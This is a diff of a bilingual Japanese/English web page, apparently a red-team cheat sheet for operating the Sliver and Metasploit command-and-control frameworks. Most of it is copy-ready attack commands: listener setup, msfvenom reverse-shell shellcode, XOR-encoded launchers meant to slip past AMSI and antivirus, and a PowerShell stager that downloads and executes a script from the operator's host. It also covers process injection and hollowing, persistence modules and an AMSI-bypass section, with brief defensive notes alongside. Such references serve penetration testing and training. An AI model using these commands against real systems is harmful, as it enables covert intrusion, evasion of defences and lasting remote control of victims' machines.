@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Command &amp; Control — d0me</title>
-<meta name="description" content="Sliver / Metasploit C2 operational reference — listeners, payloads, session ops, privesc, and lateral movement.">
+<meta name="description" content="Sliver / Metasploit C2 実務リファレンス — listener・payload・session ops・privesc・横展開まで両フレームワーク並列で整理。">
 <link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -26,7 +26,7 @@
   <div class="wrap">
     <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>Command &amp; Control</div>
     <h1>Command &amp; Control</h1>
-    <p class="lede">Operational reference for Sliver and Metasploit — listener setup, payload generation, session stabilization, privilege escalation, and lateral movement.<span class="jp">Sliver と Metasploit の実務リファレンス — listener 構築、payload 生成、session 安定化、権限昇格、横展開までを両フレームワーク並列で整理。</span></p>
+    <p class="lede">Sliver と Metasploit の実務リファレンス。listener 構築から payload 生成、session 安定化、権限昇格、横展開、AD 侵害までを両フレームワーク並列で整理する。<span class="jp">同じ手法を Sliver と MSF でどう組み立てるかを対比しながら、実運用で参照できる形にまとめた。</span></p>
   </div>
 </section>
 
@@ -42,14 +42,14 @@
     <a class="flow-phase" href="#s01">
       <span class="p-num">01 · SETUP</span>
       <span class="p-title">Setup</span>
-      <span class="p-jp">サーバ / クライアント / Armory</span>
+      <span class="p-jp">サーバ・クライアント・Armory</span>
       <span class="p-techs">sliver-server · client profile · armory · msfconsole · workspace</span>
     </a>
     <a class="flow-phase" href="#s02">
       <span class="p-num">02 · LISTENERS</span>
       <span class="p-title">Listeners</span>
       <span class="p-jp">受信基盤</span>
-      <span class="p-techs">http/mtls/dns · stage-listener · multi/handler</span>
+      <span class="p-techs">http · mtls · dns · stage-listener · multi/handler</span>
     </a>
     <a class="flow-phase" href="#s03">
       <span class="p-num">03 · PAYLOADS</span>
@@ -58,24 +58,29 @@
       <span class="p-techs">implant generate · msfvenom · XOR · staged · beacon</span>
     </a>
     <a class="flow-phase" href="#s04">
-      <span class="p-num">04 · SESSION OPS</span>
+      <span class="p-num">04 · SESSION</span>
       <span class="p-title">Session Ops</span>
       <span class="p-jp">セッション安定化</span>
       <span class="p-techs">migrate · hollow · execute-shellcode · duplication</span>
     </a>
-    <a class="flow-phase" href="#s05">
-      <span class="p-num">05 · PRIV ESC</span>
+    <a class="flow-phase" href="#s06">
+      <span class="p-num">05 · ELEVATE</span>
       <span class="p-title">Privilege Escalation</span>
       <span class="p-jp">権限昇格</span>
       <span class="p-techs">Modifiable Svc · SeImpersonate · AlwaysInstall · UAC bypass</span>
     </a>
-    <a class="flow-phase" href="#s06">
+    <a class="flow-phase" href="#s10">
       <span class="p-num">06 · LATERAL</span>
       <span class="p-title">Lateral Movement</span>
       <span class="p-jp">横展開</span>
       <span class="p-techs">BOF · psexec · jump-psexec · jump-wmiexec · SharpRDP</span>
     </a>
   </div>
+  <a class="flow-scenarios" href="#s13">
+    <span class="sc-num">→ 13</span>
+    <span class="sc-title">Domain Attack</span>
+    <span class="sc-jp">Kerberoast · Delegations · RBCD · Silver / Golden Ticket</span>
+  </a>
 </section>
 </div>
 
@@ -85,55 +90,62 @@
     <div class="toc-label">目次</div>
     <ul>
       <li><a href="#s01">01 Setup</a></li>
-      <li><a href="#s02">02 Listeners</a></li>
-      <li><a href="#s03">03 Payloads</a></li>
-      <li><a href="#s04">04 Session Ops</a></li>
-      <li><a href="#s05">05 Priv Esc</a></li>
-      <li><a href="#s06">06 Lateral</a></li>
-      <li><a href="#ref">07 References</a></li>
+      <li><a href="#s02">Listeners</a></li>
+      <li><a href="#s03">Payloads</a></li>
+      <li><a href="#s04">Session Ops</a></li>
+      <li><a href="#s05">Bypasses</a></li>
+      <li><a href="#s06">Priv Esc</a></li>
+      <li><a href="#s07">Credentials</a></li>
+      <li><a href="#s08">Token Ops</a></li>
+      <li><a href="#s09">Tunneling</a></li>
+      <li><a href="#s10">Lateral</a></li>
+      <li><a href="#s11">Persistence</a></li>
+      <li><a href="#s12">Post-Exploit</a></li>
+      <li><a href="#s13">Domain Attack</a></li>
+      <li><a href="#ref">14 References</a></li>
     </ul>
   </aside>
 
   <article class="doc">
 
     <section id="s01" class="reveal">
-      <h2><span class="num">01</span>Setup<span class="jp">サーバ / クライアント / Armory</span></h2>
-      <p>Sliver operates as a client-server C2 with an optional multiplayer mode. Metasploit runs as a single-node console with a PostgreSQL backend for workspace and loot management. Both frameworks are installed once per operator machine and reused across engagements.</p>
+      <h2><span class="num">01</span>Setup<span class="jp">サーバ・クライアント・Armory</span></h2>
+      <p>Sliver は client-server 型の C2 で、複数 operator を multiplayer モードで受け入れる。Metasploit は単一 console と PostgreSQL バックエンドで workspace / loot を管理する。両フレームワークとも operator ホストに一度導入すればエンゲージメントを跨いで再利用できる。</p>
 
-      <h3>Sliver — Server</h3>
-      <p>Fetch the pre-compiled server binary from BishopFox releases. Multiplayer mode must be explicitly enabled before any operator can attach.</p>
+      <h3>Sliver — サーバ</h3>
+      <p>BishopFox releases から pre-compiled binary を取得する。multiplayer は明示的に有効化しないと remote operator が attach できない。</p>
 
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Install and launch server</span>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># サーバ導入と起動</span>
 wget -q https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
 chmod +x ./sliver-server_linux
 ./sliver-server_linux
 
-<span class="c"># Generate operator profile (from within server console)</span>
+<span class="c"># operator profile 生成 (server console 内)</span>
 [server] sliver &gt; new-operator -n <span class="v">&lt;OPERATOR&gt;</span> -l <span class="v">&lt;LHOST&gt;</span>
 [*] Saved new client config to: /&lt;path&gt;/&lt;OPERATOR&gt;_&lt;LHOST&gt;.cfg
 
-<span class="c"># Enable multiplayer (required for remote client attach)</span>
+<span class="c"># multiplayer 有効化 (remote client attach に必須)</span>
 [server] sliver &gt; multiplayer
 [*] Multiplayer mode enabled!</code></pre></div>
 
-      <h3>Sliver — Client</h3>
+      <h3>Sliver — クライアント</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>wget -q https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux
 chmod +x ./sliver-client_linux
 ./sliver-client_linux import /&lt;path&gt;/&lt;OPERATOR&gt;_&lt;LHOST&gt;.cfg
 ./sliver-client_linux</code></pre></div>
 
       <h3>Sliver — Armory</h3>
-      <p>The Armory ships 20+ aliases (BOFs and .NET assemblies) and 100+ extensions covering situational awareness, credential access, and lateral movement. Install once per client.</p>
+      <p>Armory は 20+ の alias (BOF や .NET assembly) と 100+ の extension を提供し、状況把握・認証情報取得・横展開まで幅広くカバーする。client ごとに一度インストールする。</p>
 
       <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>sliver &gt; armory install all
 
-<span class="c"># Individual install</span>
+<span class="c"># 個別導入</span>
 sliver &gt; armory install sharpsh
 sliver &gt; armory install stracciatella
 sliver &gt; armory install rubeus</code></pre></div>
 
-      <h3>Metasploit — Console &amp; Workspace</h3>
-      <p>Ensure the PostgreSQL backend is running so <code>db_status</code> reports <em>connected</em>. Workspaces isolate hosts, credentials, and loot per engagement.</p>
+      <h3>Metasploit — console と workspace</h3>
+      <p>PostgreSQL バックエンドが動作していることを確認し (<code>db_status</code> で <em>connected</em>)、engagement 単位で workspace を切り分けると host / credential / loot が独立に管理できる。</p>
 
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>sudo systemctl start postgresql
 msfconsole -q</code></pre></div>
@@ -144,47 +156,47 @@ msfconsole -q</code></pre></div>
 <span class="k">msf6</span> &gt; hosts
 <span class="k">msf6</span> &gt; services -p 445</code></pre></div>
 
-      <div class="note"><span class="lbl">note</span>Sliver and Metasploit can coexist on the same operator host — Sliver for evasion-heavy engagements and MSF for rapid staging or post-exploitation modules. Cross-framework handoff is done via msfvenom shellcode fed into Sliver's <code>execute-shellcode</code>, or Sliver session drop into an MSF handler.</div>
+      <div class="note"><span class="lbl">note</span>Sliver と Metasploit は同一 operator ホスト上に併存させられる。evasion 重視の engagement では Sliver、素早い staging や post-exploitation モジュール利用は MSF、というハイブリッド運用が現実的。cross-framework の受け渡しは msfvenom shellcode を Sliver の <code>execute-shellcode</code> に渡すか、Sliver session から MSF handler に drop する形になる。</div>
 
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
-          <li>Egress detection on unauthorized outbound HTTPS/mTLS from operator subnets — C2 traffic often uses TLS pinning or self-signed certs, which SSL inspection can flag.</li>
-          <li>Endpoint EDR baselines catching Sliver's default implant signatures (obfuscation reduces but does not eliminate this).</li>
-          <li>Blue-team infrastructure enumeration: Shodan / Censys fingerprint of exposed Sliver / MSF listeners.</li>
+          <li>operator サブネットからの外向き HTTPS/mTLS 検知 — C2 通信は TLS pinning や self-signed 証明書に依存するため SSL inspection で異常を捉えやすい。</li>
+          <li>EDR による Sliver デフォルト implant シグネチャ検出 (obfuscation で緩和はできるが完全回避ではない)。</li>
+          <li>Blue-team による Shodan / Censys 経由の Sliver / MSF listener インフラ列挙。</li>
         </ul>
       </div>
     </section>
 
     <section id="s02" class="reveal">
       <h2><span class="num">02</span>Listeners<span class="jp">受信基盤</span></h2>
-      <p>Listeners receive callbacks from implants. Sliver separates the <em>listener</em> (network binding) from the <em>profile</em> (payload metadata) — this lets you regenerate implants for a phantom listener or stage over TCP while keeping HTTP for the second stage. Metasploit uses <code>exploit/multi/handler</code> with matching payload options.</p>
+      <p>Listener は implant からの callback を受ける。Sliver は <em>listener</em> (network binding) と <em>profile</em> (payload metadata) を分離するため、TCP で stage を送り HTTP で 2nd stage を扱うといった構成が組みやすい。Metasploit は <code>exploit/multi/handler</code> に payload オプションを合わせる。</p>
 
-      <h3>Sliver — HTTP / staged listeners</h3>
-      <p><code>profiles new</code> creates a reusable payload template; <code>stage-listener</code> serves stagers; <code>http -L</code> binds the actual reception endpoint.</p>
+      <h3>Sliver — HTTP / staged listener</h3>
+      <p><code>profiles new</code> で payload テンプレートを作り、<code>stage-listener</code> で stager 配信 URL を設定、<code>http -L</code> で実際の受信 endpoint を bind する。</p>
 
-      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># 64-bit shellcode-format profile + HTTP listener</span>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># 64bit shellcode-format profile + HTTP listener</span>
 profiles new --http <span class="v">&lt;LHOST&gt;</span>:8088 --format shellcode http-x64
 stage-listener --url tcp://<span class="v">&lt;LHOST&gt;</span>:4443 --profile http-x64
 http -L <span class="v">&lt;LHOST&gt;</span> --lport 8088
 
-<span class="c"># 32-bit variant (some AV pipelines process x86 differently)</span>
+<span class="c"># 32bit variant (AV pipeline が x86 を別処理する環境向け)</span>
 profiles new --http <span class="v">&lt;LHOST&gt;</span>:9090 --format shellcode -a x86 http-x86
 stage-listener --url tcp://<span class="v">&lt;LHOST&gt;</span>:5553 --profile http-x86
 http -L <span class="v">&lt;LHOST&gt;</span> --lport 9090
 
-<span class="c"># Service-format profile for lateral movement (jump-psexec)</span>
+<span class="c"># service-format profile (jump-psexec 用)</span>
 profiles new --http <span class="v">&lt;LHOST&gt;</span>:8099 --format service svc-lateral
 http -L <span class="v">&lt;LHOST&gt;</span> --lport 8099</code></pre></div>
 
-      <h3>Sliver — mTLS / DNS listeners</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># mTLS: encrypted mutual auth, blends with corporate mTLS</span>
+      <h3>Sliver — mTLS / DNS listener</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># mTLS — 相互認証で暗号化、corporate mTLS 環境に紛れる</span>
 mtls -L <span class="v">&lt;LHOST&gt;</span> --lport 8443
 
-<span class="c"># DNS: covert channel via TXT records</span>
+<span class="c"># DNS — TXT レコード経由の covert channel</span>
 dns -d <span class="v">&lt;C2_DOMAIN&gt;</span> --no-canaries</code></pre></div>
 
       <h3>Metasploit — multi/handler</h3>
-      <p>Match the payload, LHOST, and LPORT exactly to what msfvenom produced. Use <code>ExitOnSession false</code> for persistent handlers accepting multiple callbacks.</p>
+      <p>msfvenom で作った payload の種類・LHOST・LPORT を正確に一致させる。複数 callback を受ける permanent handler にするなら <code>ExitOnSession false</code>。</p>
 
       <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="k">msf6</span> &gt; use exploit/multi/handler
 <span class="k">msf6</span> &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
@@ -194,28 +206,28 @@ dns -d <span class="v">&lt;C2_DOMAIN&gt;</span> --no-canaries</code></pre></div>
 <span class="k">msf6</span> &gt; set ExitOnSession false
 <span class="k">msf6</span> &gt; exploit -j
 
-<span class="c"># Common payload alternates</span>
+<span class="c"># 代表的な payload 別 option</span>
 <span class="k">msf6</span> &gt; set PAYLOAD windows/x64/meterpreter/reverse_https
 <span class="k">msf6</span> &gt; set PAYLOAD windows/x64/meterpreter/reverse_winhttps
 <span class="k">msf6</span> &gt; set PAYLOAD windows/meterpreter/reverse_tcp   <span class="c"># x86</span></code></pre></div>
 
-      <div class="note"><span class="lbl">note</span>For HTTPS payloads set <code>OverrideRequestHost true</code> if traffic goes through a redirector; set <code>StagerVerifySSLCert false</code> only for self-signed testing (never in production engagements).</div>
+      <div class="note"><span class="lbl">note</span>HTTPS payload を redirector 経由で扱う場合は <code>OverrideRequestHost true</code>。<code>StagerVerifySSLCert false</code> は self-signed の検証時のみで、本番 engagement では設定しない。</div>
 
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
-          <li>Anomaly detection on beacon regularity (fixed jitter/interval callbacks stand out in NetFlow / Zeek).</li>
-          <li>JA3/JA4 TLS fingerprinting against Sliver's Go TLS stack and MSF's Ruby stack.</li>
-          <li>Rare user-agent strings from unattended hosts; Sliver's default UA is well-catalogued.</li>
+          <li>Beacon 定期性の anomaly 検知 (jitter / interval が固定なコールバックは NetFlow / Zeek で目立つ)。</li>
+          <li>JA3/JA4 TLS 指紋による Sliver の Go スタック・MSF の Ruby スタック識別。</li>
+          <li>非対話ホストからの珍しい user-agent 文字列 — Sliver のデフォルト UA は publicly indexed。</li>
         </ul>
       </div>
     </section>
 
     <section id="s03" class="reveal">
       <h2><span class="num">03</span>Payloads<span class="jp">投下物</span></h2>
-      <p>Sliver stages MSF-generated shellcode inside XOR-encoded launchers (VBA, PowerShell, C#, ASPX). Alternatively Sliver's native <code>generate beacon</code> produces standalone implants with evasion features. Metasploit's <code>msfvenom</code> is the ubiquitous shellcode generator underpinning both flows.</p>
+      <p>Sliver は MSF が生成した shellcode を XOR エンコードした launcher (VBA/PowerShell/C#/ASPX) に埋める運用が主流。あるいは Sliver ネイティブの <code>generate beacon</code> で obfuscation 込みの単独 implant を得る。Metasploit の <code>msfvenom</code> は両フローの起点となる shellcode ジェネレータ。</p>
 
       <h3>Metasploit — msfvenom shellcode</h3>
-      <p>Raw shellcode output feeds every downstream encoding step. <code>EXITFUNC=thread</code> is safer than <code>process</code> for in-process execution (leaves host process alive).</p>
+      <p>raw 出力は下流のエンコード工程すべての入力になる。<code>EXITFUNC=thread</code> は <code>process</code> より安全で in-process 実行に向く (host process を残す)。</p>
 
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># x64 raw shellcode</span>
 sudo msfvenom -p windows/x64/meterpreter/reverse_tcp \
@@ -227,15 +239,15 @@ sudo msfvenom -p windows/meterpreter/reverse_tcp \
   LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=5553 EXITFUNC=thread \
   -f raw -o <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x86.bin
 
-<span class="c"># Direct EXE (staged reverse_https, useful for AlwaysInstallElevated)</span>
+<span class="c"># staged reverse_https の直接 EXE (AlwaysInstallElevated 等で有用)</span>
 sudo msfvenom -p windows/x64/meterpreter/reverse_https \
   LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=8443 EXITFUNC=thread \
   -f exe -o <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.exe</code></pre></div>
 
-      <h3>XOR-encoded launchers (from raw shellcode)</h3>
-      <p>XOR with a single-byte key (2 in these examples) bypasses signature-based AMSI/AV pattern matches on raw meterpreter bytes. Change the key per engagement.</p>
+      <h3>XOR エンコード launcher (raw shellcode から生成)</h3>
+      <p>単一 byte key での XOR (下記例では 2) は raw meterpreter バイト列に対する signature ベース AMSI/AV マッチを避ける。key は engagement ごとに変えるのが原則。</p>
 
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># PowerShell $buf array (XOR key = 2)</span>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># PowerShell $buf 配列 (XOR key = 2)</span>
 sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=4443 EXITFUNC=thread -f raw \
   | xxd -ps -c 1 \
   | python3 -c 'import sys; key = 2; print(<span class="s">"[Byte[]] $buf = "</span> + <span class="s">","</span>.join([f<span class="s">"0x{(int(x, 16) ^ key):02X}"</span> for x in sys.stdin.read().split()]))'
@@ -244,22 +256,22 @@ sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="v">&lt;L
 sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=4443 EXITFUNC=thread -f raw \
   | python3 -c 'key = 2; import sys; data = sys.stdin.buffer.read(); enc = bytes([b ^ key for b in data]); print(f<span class="s">"byte[] buf = new byte[{len(enc)}] {{ "</span> + <span class="s">", "</span>.join([f<span class="s">"0x{b:02X}"</span> for b in enc]) + <span class="s">" };"</span>)'
 
-<span class="c"># VBA / VBS Array (XOR key = 2, chunked for line-length limits)</span>
+<span class="c"># VBA / VBS Array (XOR key = 2、行長制限のため chunk 化)</span>
 sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="v">&lt;LHOST&gt;</span> LPORT=5553 EXITFUNC=thread -f raw \
   | xxd -ps -c 1 \
   | python3 -c 'import sys; key = 2; data = [str(int(x, 16) ^ key) for x in sys.stdin.read().split()]; cs = 50; ck = [data[i:i+cs] for i in range(0, len(data), cs)]; print(<span class="s">"buf = Array("</span>, end=<span class="s">""</span>); print(<span class="s">", _\n"</span>.join([<span class="s">", "</span>.join(c) for c in ck]) + <span class="s">")"</span>)'</code></pre></div>
 
       <h3>PowerShell one-liner stager</h3>
-      <p>Downloads a second-stage script from the operator's HTTP server and IEX-executes it. UTF-16LE + base64 encoding required by <code>-EncodedCommand</code>.</p>
+      <p>attacker の HTTP サーバから 2nd stage スクリプトを取得して IEX 実行する。<code>-EncodedCommand</code> は UTF-16LE + base64 前提。</p>
 
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>echo -en <span class="s">"(New-Object System.Net.WebClient).DownloadString('http://&lt;LHOST&gt;/payload.ps1') | IEX"</span> \
   | iconv -t UTF-16LE | base64 -w 0
 
-<span class="c"># On target</span>
+<span class="c"># 対象上での実行</span>
 powershell -enc <span class="v">&lt;BASE64_PAYLOAD&gt;</span></code></pre></div>
 
-      <h3>Sliver — native beacon</h3>
-      <p>Sliver's <code>generate beacon</code> produces a standalone implant with obfuscation and AMSI evasion built in. <code>--evasion</code> enables extra hardening at a size cost.</p>
+      <h3>Sliver — ネイティブ beacon</h3>
+      <p>Sliver の <code>generate beacon</code> は obfuscation と AMSI 回避が組込まれた単独 implant を生成する。<code>--evasion</code> でさらに硬く、代わりにサイズが増える。</p>
 
       <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>profiles new --http <span class="v">&lt;LHOST&gt;</span>:8088 --format shellcode http-x64
 http -L <span class="v">&lt;LHOST&gt;</span> --lport 8088
@@ -270,86 +282,138 @@ generate beacon --http <span class="v">&lt;STAGING&gt;</span>:8088 \
 
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
-          <li>YARA rules on the msfvenom shellcode prologue and Sliver's implant framing (both are publicly indexed).</li>
-          <li>AMSI: modern Defender detects the plaintext meterpreter blob; XOR + in-memory delivery mitigates this only when AMSI is bypassed (see <a href="evasion.html">evasion</a>).</li>
-          <li>Egress DNS/HTTP logging catches stager fetches from unusual hosts.</li>
+          <li>msfvenom shellcode の prologue と Sliver implant のフレーミングに対する YARA rule (両者とも publicly indexed)。</li>
+          <li>AMSI — 現行 Defender は素の meterpreter blob を検出。XOR + in-memory 配信は AMSI bypass と組み合わせて初めて効く (<a href="evasion.html">evasion</a> 参照)。</li>
+          <li>外向き DNS/HTTP のロギングで stager fetch 先の異常検知。</li>
         </ul>
       </div>
     </section>
 
     <section id="s04" class="reveal">
       <h2><span class="num">04</span>Session Ops<span class="jp">セッション安定化</span></h2>
-      <p>Initial callbacks are unstable — the host process (Word, browser, one-shot loader) can die or be sandboxed. Migration into a stable, long-lived process (explorer, svchost, notepad) is standard hygiene. Sliver offers <code>migrate</code>, <code>execute-shellcode -p</code>, and <code>hollow</code>; Metasploit exposes the classic <code>migrate</code> command plus post modules.</p>
+      <p>初回の callback は不安定 (Word / ブラウザ / one-shot loader 由来のプロセスは短命)。長寿命の安定プロセス (explorer, svchost, notepad) への migrate は基本衛生。Sliver は <code>migrate</code> / <code>execute-shellcode -p</code> / <code>hollow</code> を提供、Metasploit は古典 <code>migrate</code> + post module。</p>
 
-      <h3>Sliver — sacrificial process + injection</h3>
-      <p>Spawn a target process first (so it belongs to the current user context), enumerate its PID, then inject. Notepad is the canonical sacrifice; <code>svchost</code> is preferred for hollowing.</p>
+      <h3>Sliver — 犠牲プロセス生成と injection</h3>
+      <p>まず犠牲プロセスを起動 (現ユーザコンテキスト継承)、PID を <code>ps</code> で拾って inject。notepad が定番の犠牲、<code>svchost</code> は hollowing の最適候補。</p>
 
-      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># Launch sacrificial process (match arch to your shellcode)</span>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># 犠牲プロセス起動 (shellcode の arch と一致させる)</span>
 execute C:\\windows\\system32\\notepad.exe
 execute -T notepad
 execute C:\\windows\\SysWOW64\\notepad.exe   <span class="c"># x86</span>
 
-<span class="c"># Or via Rubeus createnetonly (creates process in alt logon context)</span>
+<span class="c"># または Rubeus createnetonly (別 logon context でプロセス生成)</span>
 rubeus -t 20 -- createnetonly /program:C:\\windows\\SysWOW64\\notepad.exe
 rubeus -t 20 -- createnetonly /program:C:\\windows\\system32\\cmd.exe
 
-<span class="c"># Find the PID</span>
+<span class="c"># PID 特定</span>
 ps -e notepad
-ps -e explorer   <span class="c"># explorer.exe = long-lived host, ideal for beacons</span></code></pre></div>
+ps -e explorer   <span class="c"># explorer.exe = 長寿命の host、beacon に理想的</span></code></pre></div>
 
-      <h3>Sliver — inject shellcode into PID</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># x86 injection (arch auto-detected)</span>
+      <h3>Sliver — PID への shellcode inject</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># x86 injection (arch は自動判定)</span>
 execute-shellcode -A 386 -p <span class="v">&lt;PID&gt;</span> <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x86.bin
 execute-shellcode -p <span class="v">&lt;PID&gt;</span> <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x86.bin
 
-<span class="c"># x64 injection with ShikataGaNai encoding + reflection</span>
+<span class="c"># x64 injection + ShikataGaNai + reflection</span>
 execute-shellcode -p <span class="v">&lt;PID&gt;</span> <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.bin
 execute-shellcode -S -r -I 10 -p <span class="v">&lt;PID&gt;</span> <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.bin
 
-<span class="c"># Migration (native Sliver command)</span>
+<span class="c"># Sliver ネイティブの migrate</span>
 migrate -p <span class="v">&lt;PID&gt;</span></code></pre></div>
 
       <h3>Sliver — process hollowing</h3>
-      <p>Hollowing creates a suspended svchost, unmaps its image, and writes shellcode into the freed region. High evasion value but sometimes throws a benign error post-injection.</p>
+      <p>Hollowing は suspended svchost を生成し image を unmap して shellcode を書き込む。evasion 面で最も強いが、しばしば無害なエラーを吐く (shell は正常に取れる)。</p>
 
       <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>hollow svchost.exe <span class="v">&lt;PAYLOAD_PATH&gt;</span>/payload.x64.bin
 
-<span class="c"># Expected benign error (shell still received):</span>
+<span class="c"># 想定される無害エラー (shell 自体は成立):</span>
 [!] Call extension error: rpc error: code = Unknown desc = The parameter is incorrect.</code></pre></div>
 
-      <h3>Metasploit — migrate &amp; post modules</h3>
+      <h3>Metasploit — migrate と post モジュール</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">meterpreter</span><button class="copy">copy</button></div><pre><code>meterpreter &gt; ps
 meterpreter &gt; migrate <span class="v">&lt;PID&gt;</span>
-meterpreter &gt; migrate -N explorer.exe   <span class="c"># by name</span></code></pre></div>
+meterpreter &gt; migrate -N explorer.exe   <span class="c"># 名前指定</span></code></pre></div>
 
-      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># Auto-migrate post module (finds a target and migrates)</span>
+      <div class="code"><div class="code-bar"><span class="code-lang">msfconsole</span><button class="copy">copy</button></div><pre><code><span class="c"># auto-migrate post module</span>
 <span class="k">msf6</span> &gt; use post/windows/manage/migrate
 <span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
 <span class="k">msf6</span> &gt; set NAME explorer.exe
 <span class="k">msf6</span> &gt; run
 
-<span class="c"># Session persistence — auto-relaunch on session death</span>
+<span class="c"># session 死活時の自動復活 (persistence)</span>
 <span class="k">msf6</span> &gt; use exploit/windows/local/persistence
 <span class="k">msf6</span> &gt; set SESSION <span class="v">&lt;id&gt;</span>
 <span class="k">msf6</span> &gt; run</code></pre></div>
 
-      <div class="note"><span class="lbl">note</span>Always duplicate the implant into a hollowed process before running anything AV-visible (SweetPotato, mimikatz). The primary implant remaining in a sacrificial notepad will get killed the moment defender wakes up.</div>
+      <div class="note"><span class="lbl">note</span>AV 検知される可能性のあるツール (SweetPotato, mimikatz 等) を実行する前に、必ず svchost へ hollow して implant を複製する。犠牲 notepad に残った primary implant は defender 起動時に確実に殺される。</div>
 
       <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
         <ul>
-          <li>Never operate from the initial callback process. Migrate immediately.</li>
-          <li>Match architecture explicitly: x86 shellcode in x64 process (or vice versa) will crash silently.</li>
-          <li>Hollowing is the most robust technique when EDR is present, at the cost of a spurious error message.</li>
+          <li>初回 callback のプロセスから直接運用しない。即座に migrate すべし。</li>
+          <li>arch を明示的に一致させる (x86 shellcode を x64 プロセスに、逆も、silently にクラッシュする)。</li>
+          <li>EDR 有り環境では hollowing が最も robust。ただし parameter incorrect エラーが出る点は許容する。</li>
         </ul>
       </div>
     </section>
 
     <section id="s05" class="reveal">
-      <h2><span class="num">05</span>Privilege Escalation<span class="jp">権限昇格</span></h2>
-      <p>Once a stable low-privilege session is established, enumerate escalation paths. Sliver runs C# assemblies in-process (<code>execute-assembly -i</code>) or side-loads via <code>execute-assembly</code>; PowerShell scripts pass through SharpSh with AMSI bypass. Metasploit's <code>local_exploit_suggester</code> maps kernel bugs; specific exploit modules handle SeImpersonate/UAC.</p>
+      <h2><span class="num">05</span>Bypasses<span class="jp">AMSI / CLM / Application Whitelisting</span></h2>
+      <p>Sliver-specific な bypass 実行手段のみここに集約する。AMSI patch / CLM 脱出 / AppLocker 迂回の原理そのものは <a href="evasion.html">evasion</a> sheet が本文。ここでは Sliver 上でどう callable にするかを扱う。</p>
 
-      <h3>Enumeration — Sliver</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># Identity / privileges via BOF (quieter than shell whoami)</span>
+      <h3>SharpSh — AMSI-clean な PowerShell 子プロセス</h3>
+      <p>SharpSh は AMSI patch 済みの powershell child process を spawn し、そこで任意コマンドを走らせる仕組み。Sliver から <code>execute-assembly</code> で呼ばれ、遠隔からダウンロードした .ps1 に対して string parameter を渡せる。長いコマンドは base64 encoded で <code>-e -c</code> に渡し、256 文字を超える場合は <code>-i</code> フラグで in-process 実行する (donut backend の制限回避)。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># 単一コマンド実行</span>
+sharpsh -t 20 -- <span class="s">'-c "whoami /all"'</span>
+sharpsh -t 20 -- <span class="s">'-c "$ExecutionContext.SessionState.LanguageMode"'</span>
+
+<span class="c"># 引数なしスクリプトを URL から (適当なダミー引数 1 が必要)</span>
